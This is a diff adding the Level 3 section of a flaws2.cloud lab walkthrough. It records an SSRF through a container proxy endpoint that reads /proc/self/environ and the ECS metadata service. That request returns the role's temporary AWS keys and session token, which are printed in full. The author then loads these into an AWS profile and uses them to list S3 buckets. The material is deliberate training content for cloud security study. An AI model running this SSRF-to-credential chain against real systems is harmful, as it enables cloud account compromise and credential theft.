@@ -338,13 +338,69 @@ Login http://container.target.flaws2.cloud/ with **laws2**:**secret_password** c
 ### Level 3
 Visit: http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud/
 
+Check: http://container.target.flaws2.cloud/proxy/file:///proc/self/environ
+
+```
+HOSTNAME=ip-172-31-54-33.ec2.internalHOME=/rootAWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/cb3fc49d-d169-4964-bb43-f6a5d33034bdAWS_EXECUTION_ENV=AWS_ECS_FARGATEECS_AGENT_URI=http://169.254.170.2/api/c53454aacff34019a681da88d44718fc-3779599274AWS_DEFAULT_REGION=us-east-1ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/c53454aacff34019a681da88d44718fc-3779599274ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/c53454aacff34019a681da88d44718fc-3779599274PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binAWS_REGION=us-east-1PWD=/
+```
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/e8b668d7-e75c-4ef0-9b82-40f13a280277)
+
+Access: http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v4/c53454aacff34019a681da88d44718fc-3779599274
+
+```
+{"DockerId":"c53454aacff34019a681da88d44718fc-3779599274","Name":"level3","DockerName":"level3","Image":"653711331788.dkr.ecr.us-east-1.amazonaws.com/level2","ImageID":"sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e","Labels":{"com.amazonaws.ecs.cluster":"arn:aws:ecs:us-east-1:653711331788:cluster/level3","com.amazonaws.ecs.container-name":"level3","com.amazonaws.ecs.task-arn":"arn:aws:ecs:us-east-1:653711331788:task/level3/c53454aacff34019a681da88d44718fc","com.amazonaws.ecs.task-definition-family":"level3","com.amazonaws.ecs.task-definition-version":"3"},"DesiredStatus":"RUNNING","KnownStatus":"RUNNING","Limits":{"CPU":2},"CreatedAt":"2024-05-10T21:30:27.873125754Z","StartedAt":"2024-05-10T21:30:27.873125754Z","Type":"NORMAL","Health":{"status":"UNHEALTHY","statusSince":"2024-05-10T21:32:28.248144681Z","exitCode":255,"output":"OCI runtime exec failed: exec failed: unable to start container process: exec: \"exit 0\": executable file not found in $PATH: unknown"},"LogDriver":"awslogs","LogOptions":{"awslogs-group":"/ecs/level3","awslogs-region":"us-east-1","awslogs-stream":"ecs/level3/c53454aacff34019a681da88d44718fc"},"ContainerARN":"arn:aws:ecs:us-east-1:653711331788:container/level3/c53454aacff34019a681da88d44718fc/866c9a9b-a7e8-4f32-a500-901bf63938ad","Networks":[{"NetworkMode":"awsvpc","IPv4Addresses":["172.31.54.33"],"AttachmentIndex":0,"MACAddress":"16:ff:e3:3e:39:81","IPv4SubnetCIDRBlock":"172.31.48.0/20","DomainNameServers":["172.31.0.2"],"DomainNameSearchList":["ec2.internal"],"PrivateDNSName":"ip-172-31-54-33.ec2.internal","SubnetGatewayIpv4Address":"172.31.48.1/20"}],"Snapshotter":"overlayfs"}
+```
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/618491d4-5cea-4a98-b32d-ed1e2dc41bd4)
+
+**Visit:** http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/cb3fc49d-d169-4964-bb43-f6a5d33034bd
+
+```
+{"RoleArn":"arn:aws:iam::653711331788:role/level3",
+"AccessKeyId":"ASIAZQNB3KHGJRWV2W7 F",
+"SecretAccessKey":"Wa3QjgyZbzYwMCq7lBez+jJ2hD1inK+q/AtjVtL f",
+"Token":"IQoJb3JpZ2luX2VjEEgaCXVzLWVhc3QtMSJGMEQCIBxeMpIsgtrE4nox5V7LitHwYD0Wn7YoDiXMVAVvfRFwAiB0ax+7l99UHaYccxYJZpdCixIbOsp53L2tNxkckbP00SrsAwjQ//////////8BEAMaDDY1MzcxMTMzMTc4OCIMkDVATce38yXghiPxKsAD9tMvaeNH04UFKR1+p7Qkt7/lIdppypnJonxbZl1QKQG43JdfyazMG1UWZp8bGdZdDOko9WrS5T7rfve/vEZzH/45u/3DNZt5nwSfHrG/sJKgqshpGf2EsaSymHuKGbbcvg5XSpOnGo+j73L7fTpcBr/7vPAy+YrZJULD64aZOrg162HLEa7I6b/yALVm5jkt9kb/1oVvNab8WI/e4CuvqIBI7LEGysZuLm8m5FkRHgF+WwhWmcfnW0YLaWKrVeFF8vGe2Pohftm5XXreghLJwjMUFoSPtdtT7PZGzRUpdUp3HqK0vQd5nZVfcme+GM07O4elZKFr4Kq5X+l0MAQBiSZr0IS5OkRupKT0zYxrhf98MrUCuq5epgL3PjxUwB1jxGtSBMEUR479WnMKVpWsyXOB84i9vLWunsepBerekgsf6TUamDX91m6xEX9HB4IN0AUGl90V7IScyPGLKJaj4yYCmrxZSwAJ96nS8FEyiY7v9i+t3UGoZPoJ+MlllYHFT8fQ/L9RGGrlif4V3zu59BXA47j0wnHHZmGDi1b2lu8/NrmmKURMqGvQkau/1oXB/bTw6ogjnZ5PHRESE8bbADCNwoWzBjqmAS3TkmGX560u0+BJYmVaA3aQ/6+f4tKOLE2uT8dDzQd5awlxq4jGjnook+7YH/tU8ECjkXzA7wNxHip5hY/8z3mHnJIMhsYMCYrC9xlbIjJD8vIeujED26A/0TpaIVdWV6G8CvFCQ6UdMieMb5OjnxtZIwWFG+kRHvAGSa1j7CMfvgCuSm+xZfUrPO3A97YbFWAUSFtaTtmmj45PcWod6KxKiHF3iGI =",
+"Expiration":"2024-06-06T13:11:09Z"}
+```
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/7a1d4b2e-16a6-4040-8355-eb5fd87dbf85)
 
 
+```
+RedCloud]─[~/Desktop]
+└──╼ $nano ~/.aws/credentials
+┌─[cwl@RedCloud]─[~/Desktop]
+└──╼ $tail -n 4 ~/.aws/credentials
+[level3]
+AWS_ACCESS_KEY_ID=ASIAZQNB3KHGJRWV2W7 F
+AWS_SECRET_ACCESS_KEY=Wa3QjgyZbzYwMCq7lBez+jJ2hD1inK+q/AtjVtL f
+AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEEgaCXVzLWVhc3QtMSJGMEQCIBxeMpIsgtrE4nox5V7LitHwYD0Wn7YoDiXMVAVvfRFwAiB0ax+7l99UHaYccxYJZpdCixIbOsp53L2tNxkckbP00SrsAwjQ//////////8BEAMaDDY1MzcxMTMzMTc4OCIMkDVATce38yXghiPxKsAD9tMvaeNH04UFKR1+p7Qkt7/lIdppypnJonxbZl1QKQG43JdfyazMG1UWZp8bGdZdDOko9WrS5T7rfve/vEZzH/45u/3DNZt5nwSfHrG/sJKgqshpGf2EsaSymHuKGbbcvg5XSpOnGo+j73L7fTpcBr/7vPAy+YrZJULD64aZOrg162HLEa7I6b/yALVm5jkt9kb/1oVvNab8WI/e4CuvqIBI7LEGysZuLm8m5FkRHgF+WwhWmcfnW0YLaWKrVeFF8vGe2Pohftm5XXreghLJwjMUFoSPtdtT7PZGzRUpdUp3HqK0vQd5nZVfcme+GM07O4elZKFr4Kq5X+l0MAQBiSZr0IS5OkRupKT0zYxrhf98MrUCuq5epgL3PjxUwB1jxGtSBMEUR479WnMKVpWsyXOB84i9vLWunsepBerekgsf6TUamDX91m6xEX9HB4IN0AUGl90V7IScyPGLKJaj4yYCmrxZSwAJ96nS8FEyiY7v9i+t3UGoZPoJ+MlllYHFT8fQ/L9RGGrlif4V3zu59BXA47j0wnHHZmGDi1b2lu8/NrmmKURMqGvQkau/1oXB/bTw6ogjnZ5PHRESE8bbADCNwoWzBjqmAS3TkmGX560u0+BJYmVaA3aQ/6+f4tKOLE2uT8dDzQd5awlxq4jGjnook+7YH/tU8ECjkXzA7wNxHip5hY/8z3mHnJIMhsYMCYrC9xlbIjJD8vIeujED26A/0TpaIVdWV6G8CvFCQ6UdMieMb5OjnxtZIwWFG+kRHvAGSa1j7CMfvgCuSm+xZfUrPO3A97YbFWAUSFtaTtmmj45PcWod6KxKiHF3iGI =
+┌─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws sts get-caller-identity --profile level3
+{
+    "UserId": "AROAJQMBDNUMIKLZKMF64:c53454aacff34019a681da88d44718fc",
+    "Account": "653711331788",
+    "Arn": "arn:aws:sts::653711331788:assumed-role/level3/c53454aacff34019a681da88d44718fc"
+}
+```
+
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/5fe307ac-ee5c-4f27-a205-3134bbf21668)
 
 
+```
+┌─[✗]─[cwl@RedCloud]─[~/Desktop]
+└──╼ $aws s3 ls --profile level3
+2020-07-03 06:46:14 flaws2.cloud
+2020-07-04 01:00:56 level1.flaws2.cloud
+2020-07-04 01:00:59 level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
+2020-07-04 01:01:00 level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud
+2020-07-08 05:08:15 the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud
+```
 
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/9606015d-67d9-488c-b32b-6d209e122133)
 
+Navigate: http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud/
 
-
-
+![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/0068b58a-4a3e-445c-abaf-a3496de1f4db)
 
